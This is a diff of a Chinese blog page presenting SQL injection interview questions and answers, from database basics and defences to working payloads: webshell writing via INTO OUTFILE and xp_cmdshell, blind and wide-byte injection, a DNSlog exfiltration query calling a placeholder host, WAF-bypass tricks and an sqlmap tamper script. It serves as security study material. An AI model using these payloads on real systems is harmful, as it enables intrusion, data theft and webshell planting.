@@ -554,17 +554,17 @@
   <div class="main-content">
     <article class="post post-detail">
       <div class="post-content">
-        <h1 id="sql注入"><a class="markdownIt-Anchor" href="#sql注入"></a> SQL注入</h1>
-<h2 id="一-知识储备类"><a class="markdownIt-Anchor" href="#一-知识储备类"></a> 一、知识储备类</h2>
-<h3 id="1sql与nosql的区别"><a class="markdownIt-Anchor" href="#1sql与nosql的区别"></a> 1.SQL与NoSQL的区别？</h3>
+        <h1 id="sql注入"><a class="markdownIt-Anchor" href="#sql注入">#</a> SQL 注入</h1>
+<h2 id="一-知识储备类"><a class="markdownIt-Anchor" href="#一-知识储备类">#</a> 一、知识储备类</h2>
+<h3 id="1sql与nosql的区别"><a class="markdownIt-Anchor" href="#1sql与nosql的区别">#</a> 1.SQL 与 NoSQL 的区别？</h3>
 <p>SQL：关系型数据库</p>
 <p>NoSQL：非关系型数据库</p>
-<p>存储方式：SQL具有特定的结构表，NoSQL存储方式灵活</p>
-<p>性能：NoSQL较优于SQL</p>
-<p>数据类型：SQL适用结构化数据，如账号密码；NoSQL适用非结构化数据，如文章、评论</p>
-<h3 id="2常见的关系型数据库"><a class="markdownIt-Anchor" href="#2常见的关系型数据库"></a> 2.常见的关系型数据库？</h3>
+<p>存储方式：SQL 具有特定的结构表，NoSQL 存储方式灵活</p>
+<p>性能：NoSQL 较优于 SQL</p>
+<p>数据类型：SQL 适用结构化数据，如账号密码；NoSQL 适用非结构化数据，如文章、评论</p>
+<h3 id="2常见的关系型数据库"><a class="markdownIt-Anchor" href="#2常见的关系型数据库">#</a> 2. 常见的关系型数据库？</h3>
 <p>mysql、sqlserver、oracle、access、sqlite、postgreSQL</p>
-<h3 id="3常见的数据库端口"><a class="markdownIt-Anchor" href="#3常见的数据库端口"></a> 3.常见的数据库端口？</h3>
+<h3 id="3常见的数据库端口"><a class="markdownIt-Anchor" href="#3常见的数据库端口">#</a> 3. 常见的数据库端口？</h3>
 <p>关系型：</p>
 <p>mysql:3306</p>
 <p>sqlserver:1433</p>
@@ -575,16 +575,16 @@
 <p>MongoDB:27017</p>
 <p>redis:6379</p>
 <p>memcached:11211</p>
-<h3 id="4简述数据库的存储引擎"><a class="markdownIt-Anchor" href="#4简述数据库的存储引擎"></a> 4.简述数据库的存储引擎</h3>
-<p>数据库存储引擎是数据库底层软件组织，数据库管理系统(DBMS)使用数据引擎进行创建、查询、更新和删除数据。不同的存储引擎提供不同的存储机制、索引技巧、锁定水平等功能，使用不同的存储引擎，还可以获得特定的功能。</p>
-<p>InnoDB：主流的存储引擎，mysql默认存储引擎</p>
+<h3 id="4简述数据库的存储引擎"><a class="markdownIt-Anchor" href="#4简述数据库的存储引擎">#</a> 4. 简述数据库的存储引擎</h3>
+<p>数据库存储引擎是数据库底层软件组织，数据库管理系统 (DBMS) 使用数据引擎进行创建、查询、更新和删除数据。不同的存储引擎提供不同的存储机制、索引技巧、锁定水平等功能，使用不同的存储引擎，还可以获得特定的功能。</p>
+<p>InnoDB：主流的存储引擎，mysql 默认存储引擎</p>
 <p>MyISAM：查询、插入速度快，不支持事务</p>
-<p>MEMORY：hash索引、BTREE索引</p>
-<h3 id="5sql注入有哪几种注入类型"><a class="markdownIt-Anchor" href="#5sql注入有哪几种注入类型"></a> 5.SQL注入有哪几种注入类型？</h3>
+<p>MEMORY：hash 索引、BTREE 索引</p>
+<h3 id="5sql注入有哪几种注入类型"><a class="markdownIt-Anchor" href="#5sql注入有哪几种注入类型">#</a> 5.SQL 注入有哪几种注入类型？</h3>
 <p>从注入参数类型分：数字型注入、字符型注入、搜索型注入</p>
 <p>从注入方法分：基于报错、基于布尔盲注、基于时间盲注、联合查询、堆叠注入、内联查询注入、宽字节注入</p>
-<p>从提交方式分：GET注入、POST注入、COOKIE注入、HTTP头注入</p>
-<h3 id="6sql注入的危害及防御"><a class="markdownIt-Anchor" href="#6sql注入的危害及防御"></a> 6.SQL注入的危害及防御？</h3>
+<p>从提交方式分：GET 注入、POST 注入、COOKIE 注入、HTTP 头注入</p>
+<h3 id="6sql注入的危害及防御"><a class="markdownIt-Anchor" href="#6sql注入的危害及防御">#</a> 6.SQL 注入的危害及防御？</h3>
 <p>危害：</p>
 <p>数据库泄露</p>
 <p>数据库被破坏</p>
@@ -593,94 +593,94 @@
 <p>防御：</p>
 <p>代码层面对查询参数进行转义</p>
 <p>预编译与参数绑定</p>
-<p>利用WAF防御</p>
-<h3 id="7如果存在sql注入怎么判断不同的数据库"><a class="markdownIt-Anchor" href="#7如果存在sql注入怎么判断不同的数据库"></a> 7.如果存在SQL注入怎么判断不同的数据库？</h3>
+<p>利用 WAF 防御</p>
+<h3 id="7如果存在sql注入怎么判断不同的数据库"><a class="markdownIt-Anchor" href="#7如果存在sql注入怎么判断不同的数据库">#</a> 7. 如果存在 SQL 注入怎么判断不同的数据库？</h3>
 <p>根据报错信息判断</p>
-<p>根据执行函数返回的结果判断，如len()和lenth()，version()和@@version等</p>
+<p>根据执行函数返回的结果判断，如 len () 和 lenth ()，version () 和 @@version 等</p>
 <p>根据注释符判断</p>
-<h3 id="8mysql的网站注入50以上和50以下有什么区别"><a class="markdownIt-Anchor" href="#8mysql的网站注入50以上和50以下有什么区别"></a> 8.mysql的网站注入，5.0以上和5.0以下有什么区别？</h3>
-<p>从sql注入的角度来说，mysql5.0以下版本没有information_schema这个系统库，无法列出表名列名，只能暴力跑</p>
-<h3 id="9mysql一个和两个什么区别"><a class="markdownIt-Anchor" href="#9mysql一个和两个什么区别"></a> 9.Mysql一个@和两个@什么区别</h3>
-<p>一个@是用户自定义变量</p>
-<p>两个@是系统变量，如@@version、@@user</p>
-<h3 id="10mysql注入绕过常用的函数"><a class="markdownIt-Anchor" href="#10mysql注入绕过常用的函数"></a> 10.MYSQL注入/绕过常用的函数</h3>
+<h3 id="8mysql的网站注入50以上和50以下有什么区别"><a class="markdownIt-Anchor" href="#8mysql的网站注入50以上和50以下有什么区别">#</a> 8.mysql 的网站注入，5.0 以上和 5.0 以下有什么区别？</h3>
+<p>从 sql 注入的角度来说，mysql5.0 以下版本没有 information_schema 这个系统库，无法列出表名列名，只能暴力跑</p>
+<h3 id="9mysql一个和两个什么区别"><a class="markdownIt-Anchor" href="#9mysql一个和两个什么区别">#</a> 9.Mysql 一个 @和两个 @什么区别</h3>
+<p>一个 @是用户自定义变量</p>
+<p>两个 @是系统变量，如 @@version、@@user</p>
+<h3 id="10mysql注入绕过常用的函数"><a class="markdownIt-Anchor" href="#10mysql注入绕过常用的函数">#</a> 10.MYSQL 注入 / 绕过常用的函数</h3>
 <p>注入常用函数：</p>
-<p>database() 返回当前数据库名</p>
-<p>user() 返回当前数据库用户名</p>
-<p>updatexml() 更新xml文档，常用于报错注入</p>
-<p>mid() 从指定字段中提取出字段的内容</p>
-<p>limit() 返回结果中的前几条数据或者中间的数据</p>
-<p>concat() 返回参数产生的字符串</p>
-<p>group_concat() 分组拼接函数</p>
-<p>count() 返回指定参数的数目</p>
-<p>rand() 参数0~1个随机数</p>
-<p>flood() 向下取整</p>
-<p>substr() 截取字符串</p>
-<p>ascii() 返回字符串的ascii码</p>
-<p>left() 返回字符串最左边指定个数的字符</p>
-<p>ord() 返回字符的ascii码</p>
-<p>length() 返回字符串长度</p>
-<p>sleep() 延时函数</p>
+<p>database () 返回当前数据库名</p>
+<p>user () 返回当前数据库用户名</p>
+<p>updatexml () 更新 xml 文档，常用于报错注入</p>
+<p>mid () 从指定字段中提取出字段的内容</p>
+<p>limit () 返回结果中的前几条数据或者中间的数据</p>
+<p>concat () 返回参数产生的字符串</p>
+<p>group_concat () 分组拼接函数</p>
+<p>count () 返回指定参数的数目</p>
+<p>rand () 参数 0~1 个随机数</p>
+<p>flood () 向下取整</p>
+<p>substr () 截取字符串</p>
+<p>ascii () 返回字符串的 ascii 码</p>
+<p>left () 返回字符串最左边指定个数的字符</p>
+<p>ord () 返回字符的 ascii 码</p>
+<p>length () 返回字符串长度</p>
+<p>sleep () 延时函数</p>
 <p>等价函数绕过，反之亦可：</p>
 <p>group_concat() ==&gt; concat_ws()</p>
 <p>sleep() ==&gt; benchmark()</p>
 <p>mid()、substr() ==&gt; substring()</p>
 <p>user() ==&gt; @@user</p>
 <p>updatexml() ==&gt; extractvalue()</p>
-<h3 id="11udf提权原理"><a class="markdownIt-Anchor" href="#11udf提权原理"></a> 11.UDF提权原理？</h3>
-<p>mysql支持用户自定义函数，将含有自定义函数的dll放入特定的文件夹，声明引入dll中的执行函数，使用执行函数执行系统命令</p>
-<h3 id="12mssql差异备份原理及条件"><a class="markdownIt-Anchor" href="#12mssql差异备份原理及条件"></a> 12.MSSQL差异备份原理及条件？</h3>
+<h3 id="11udf提权原理"><a class="markdownIt-Anchor" href="#11udf提权原理">#</a> 11.UDF 提权原理？</h3>
+<p>mysql 支持用户自定义函数，将含有自定义函数的 dll 放入特定的文件夹，声明引入 dll 中的执行函数，使用执行函数执行系统命令</p>
+<h3 id="12mssql差异备份原理及条件"><a class="markdownIt-Anchor" href="#12mssql差异备份原理及条件">#</a> 12.MSSQL 差异备份原理及条件？</h3>
 <p>原理：</p>
-<p>完整备份后，再次对数据库进行修改，差异备份会记录最后的LSN，将shell写入数据库，备份成asp即可getshell</p>
+<p>完整备份后，再次对数据库进行修改，差异备份会记录最后的 LSN，将 shell 写入数据库，备份成 asp 即可 getshell</p>
 <p>条件：</p>
-<p>MSSQL具有dbo或sa权限</p>
+<p>MSSQL 具有 dbo 或 sa 权限</p>
 <p>支持堆叠查询</p>
 <p>找到网站的绝对路径</p>
-<h2 id="二-实操技能类"><a class="markdownIt-Anchor" href="#二-实操技能类"></a> 二、实操技能类</h2>
-<h3 id="1sql注入写shell的条件用法"><a class="markdownIt-Anchor" href="#1sql注入写shell的条件用法"></a> 1.SQL注入写shell的条件，用法</h3>
+<h2 id="二-实操技能类"><a class="markdownIt-Anchor" href="#二-实操技能类">#</a> 二、实操技能类</h2>
+<h3 id="1sql注入写shell的条件用法"><a class="markdownIt-Anchor" href="#1sql注入写shell的条件用法">#</a> 1.SQL 注入写 shell 的条件，用法</h3>
 <p>条件：</p>
-<p>当前用户具有dba权限</p>
+<p>当前用户具有 dba 权限</p>
 <p>找到网站绝对路径</p>
 <p>网站有可写目录</p>
-<p>mysql的配置secure_file_priv为空</p>
+<p>mysql 的配置 secure_file_priv 为空</p>
 <p>用法：</p>
 <p>mysql:</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,2,&#x27;</span>shell内容<span class="string">&#x27; into outfile &quot;绝对路径\shell.php&quot; %23</span></span><br></pre></td></tr></table></figure>
 <p>sqlserver:</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;EXEC master..xp_cmdshell &#x27;</span>echo &quot;shell内容&quot; <span class="operator">&gt;</span> 绝对路径\shell.asp<span class="string">&#x27; --</span></span><br></pre></td></tr></table></figure>
-<h3 id="2sql注入过滤了逗号怎么弄"><a class="markdownIt-Anchor" href="#2sql注入过滤了逗号怎么弄"></a> 2.sql注入过滤了逗号，怎么弄?</h3>
-<p>join绕过：</p>
+<h3 id="2sql注入过滤了逗号怎么弄"><a class="markdownIt-Anchor" href="#2sql注入过滤了逗号怎么弄">#</a> 2.sql 注入过滤了逗号，怎么弄？</h3>
+<p>join 绕过：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> ((<span class="keyword">select</span> <span class="number">1</span>)A <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)B <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">3</span>)C <span class="keyword">join</span> (<span class="keyword">select</span> group_concat(<span class="keyword">user</span>(),<span class="string">&#x27; &#x27;</span>,database(),<span class="string">&#x27; &#x27;</span>,@<span class="variable">@datadir</span>))D);</span><br></pre></td></tr></table></figure>
-<h3 id="3sleep被禁用后还能怎么进行sql注入"><a class="markdownIt-Anchor" href="#3sleep被禁用后还能怎么进行sql注入"></a> 3.sleep被禁用后还能怎么进行sql注入</h3>
-<p>benchmark代替sleep:</p>
+<h3 id="3sleep被禁用后还能怎么进行sql注入"><a class="markdownIt-Anchor" href="#3sleep被禁用后还能怎么进行sql注入">#</a> 3.sleep 被禁用后还能怎么进行 sql 注入</h3>
+<p>benchmark 代替 sleep:</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> if(ascii(<span class="built_in">substring</span>((database()),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span>,(<span class="keyword">select</span> benchmark(<span class="number">10000000</span>,md5(<span class="number">0x41</span>))),<span class="number">1</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
 <p>笛卡尔积盲注：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> ctf_test <span class="keyword">where</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> information_schema.columns A, information_schema.columns B, information_schema.tables C)</span><br></pre></td></tr></table></figure>
-<p>RLIKE盲注：</p>
+<p>RLIKE 盲注：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag <span class="keyword">where</span> flag<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> if(mid(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;r&#x27;</span>,concat(rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>)) RLIKE <span class="string">&#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+cd&#x27;</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
-<h3 id="4什么是宽字节注入如何操作"><a class="markdownIt-Anchor" href="#4什么是宽字节注入如何操作"></a> 4.什么是宽字节注入？如何操作？</h3>
+<h3 id="4什么是宽字节注入如何操作"><a class="markdownIt-Anchor" href="#4什么是宽字节注入如何操作">#</a> 4. 什么是宽字节注入？如何操作？</h3>
 <p>宽字节注入：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当php开启gpc或者使用addslashes函数时，单引号&#x27;被加上反斜杠\&#x27;，其中\的URL编码为%5C，我们传入%df&#x27;，等价于%df%5C&#x27;，此时若程序的默认字符集是GBK，mysql用GBK编码时会认为%df%5C是一个宽字符縗，于是%df%5C&#x27;便等价于縗&#x27;，产生注入。</span><br></pre></td></tr></table></figure>
 <p>操作：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span>df<span class="string">&#x27; and 1=2 union select 1,2,user(),4 %23</span></span><br></pre></td></tr></table></figure>
-<h3 id="5怎样进行盲注速度更快"><a class="markdownIt-Anchor" href="#5怎样进行盲注速度更快"></a> 5.怎样进行盲注速度更快？</h3>
-<p>DNSlog盲注：</p>
+<h3 id="5怎样进行盲注速度更快"><a class="markdownIt-Anchor" href="#5怎样进行盲注速度更快">#</a> 5. 怎样进行盲注速度更快？</h3>
+<p>DNSlog 盲注：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and load_file(concat(&#x27;</span>\\\\<span class="string">&#x27;,(select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="string">&#x27; limit 1,1),&#x27;</span>.your<span class="operator">-</span>dnslog.com\\cHr1s<span class="string">&#x27;))--+</span></span><br></pre></td></tr></table></figure>
-<h3 id="6什么是二次注入"><a class="markdownIt-Anchor" href="#6什么是二次注入"></a> 6.什么是二次注入？</h3>
+<h3 id="6什么是二次注入"><a class="markdownIt-Anchor" href="#6什么是二次注入">#</a> 6. 什么是二次注入？</h3>
 <p>参数传入的恶意数据在传入时被转义，但是在数据库处理时又被还原并存储在数据库中，导致二次注入。</p>
 <p>举例：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注册用户名admin&#x27;#用户，传入值为admin\&#x27;#，但是在存储数据库时值变为admin&#x27;#，此时若修改密码为123456，管理员admin密码就被修改为123456</span><br></pre></td></tr></table></figure>
-<h3 id="7sql注入常见的过waf方法"><a class="markdownIt-Anchor" href="#7sql注入常见的过waf方法"></a> 7.sql注入常见的过WAF方法？</h3>
+<h3 id="7sql注入常见的过waf方法"><a class="markdownIt-Anchor" href="#7sql注入常见的过waf方法">#</a> 7.sql 注入常见的过 WAF 方法？</h3>
 <p>内联注释绕过</p>
 <p>填充大量脏数据绕过</p>
 <p>垃圾参数填充绕过</p>
-<p>改变提交方式绕过，如GET方式变为POST方式提交</p>
-<p>随机agent头绕过</p>
-<p>fuzz过滤函数，函数替换绕过</p>
-<h3 id="8sqlmap如何编写tamper"><a class="markdownIt-Anchor" href="#8sqlmap如何编写tamper"></a> 8.sqlmap如何编写tamper？</h3>
-<p>tamper固定模板如下：</p>
+<p>改变提交方式绕过，如 GET 方式变为 POST 方式提交</p>
+<p>随机 agent 头绕过</p>
+<p>fuzz 过滤函数，函数替换绕过</p>
+<h3 id="8sqlmap如何编写tamper"><a class="markdownIt-Anchor" href="#8sqlmap如何编写tamper">#</a> 8.sqlmap 如何编写 tamper？</h3>
+<p>tamper 固定模板如下：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lib.core.enums import PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ <span class="operator">=</span> PRIORITY.LOW</span><br><span class="line"></span><br><span class="line">def dependencies():</span><br><span class="line"></span><br><span class="line">pass</span><br><span class="line"></span><br><span class="line">def tamper(payload, <span class="operator">*</span><span class="operator">*</span>kwargs):</span><br><span class="line"></span><br><span class="line">pass</span><br><span class="line"></span><br><span class="line">PROIORITY</span><br></pre></td></tr></table></figure>
-<p>用于定义tamper优先级，当调用多个tamper时生效，优先级如下，数值越大优先级越高</p>
+<p>用于定义 tamper 优先级，当调用多个 tamper 时生效，优先级如下，数值越大优先级越高</p>
 <p>LOWEST = -100</p>
 <p>LOWER = -50</p>
 <p>LOW = -10</p>
@@ -689,13 +689,13 @@
 <p>HIGHER = 50</p>
 <p>HIGHEST = 100</p>
 <p>dependencies</p>
-<p>用于提示用户tamper适用范围，具体代码如下：</p>
+<p>用于提示用户 tamper 适用范围，具体代码如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line"></span><br><span class="line">from lib.core.common import singleTimeWarnMessage</span><br><span class="line"></span><br><span class="line">from lib.core.enums import DBMS</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line">def dependencies():</span><br><span class="line"></span><br><span class="line">singleTimeWarnMessage(&quot;过狗tamper &#x27;%s&#x27; 只针对 %s&quot; % (os.path.basename(__file__).split(&quot;.&quot;)[0], DBMS.MYSQL))</span><br></pre></td></tr></table></figure>
-<p>DBMS.MYSQL代表MYSQL，其他数据库类推</p>
+<p>DBMS.MYSQL 代表 MYSQL，其他数据库类推</p>
 <p>Tamper</p>
-<p>tamper关键函数，用于定义过滤规则，示例代码如下：</p>
+<p>tamper 关键函数，用于定义过滤规则，示例代码如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line"></span><br><span class="line">payload=payload.replace(&#x27;AND&#x27;,&#x27;/*!29440AND*/&#x27;)</span><br><span class="line"></span><br><span class="line">payload=payload.replace(&#x27;ORDER&#x27;,&#x27;/*!29440order*/&#x27;)</span><br><span class="line"></span><br><span class="line">payload=payload.replace(&#x27;LIKE USER()&#x27;,&#x27;like (user/**/())&#x27;)</span><br><span class="line"></span><br><span class="line">payload=payload.replace(&#x27;DATABASE()&#x27;,&#x27;database/*!29440*/()&#x27;)</span><br><span class="line"></span><br><span class="line">payload=payload.replace(&#x27;CURRENT_USER()&#x27;,&#x27;CURRENT_USER/**/()&#x27;)</span><br><span class="line"></span><br><span class="line">payload=payload.replace(&#x27;SESSION_USER()&#x27;,&#x27;SESSION_USER(%0a)&#x27;)</span><br><span class="line"></span><br><span class="line">payload=payload.replace(&#x27;UNION ALL SELECT&#x27;,&#x27;union/*!29440select*/&#x27;)</span><br><span class="line"></span><br><span class="line">payload=payload.replace(&#x27;super_priv&#x27;,&#x27;/*!29440/**/super_priv*/&#x27;)</span><br><span class="line"></span><br><span class="line">payload=payload.replace(&#x27;and host=&#x27;,&#x27;/*!29440and*/host/*!11440=*/&#x27;)</span><br><span class="line"></span><br><span class="line">payload=payload.replace(&#x27;BENCHMARK(&#x27;,&#x27;BENCHMARK/*!29440*/(&#x27;)</span><br><span class="line"></span><br><span class="line">payload=payload.replace(&#x27;SLEEP(&#x27;,&#x27;sleep/**/(&#x27;)</span><br><span class="line"></span><br><span class="line">return payload</span><br></pre></td></tr></table></figure>
-<p>fuzz出具体payload后对关键字符进行替换</p>
+<p>fuzz 出具体 payload 后对关键字符进行替换</p>
 
       </div>
       <div class="post-tags-categories">
@@ -748,12 +748,12 @@
       </div>
       
       <!-- <div class="content">
-         DVWA通关手册
- Brute Force
+        # DVWA 通关手册
+# Brute Force
 登录界面
- 
- Low
-1234567891011121314151617
+# 
+# Low
+12345678910111213141
       </div> -->
     </a>
   </div>
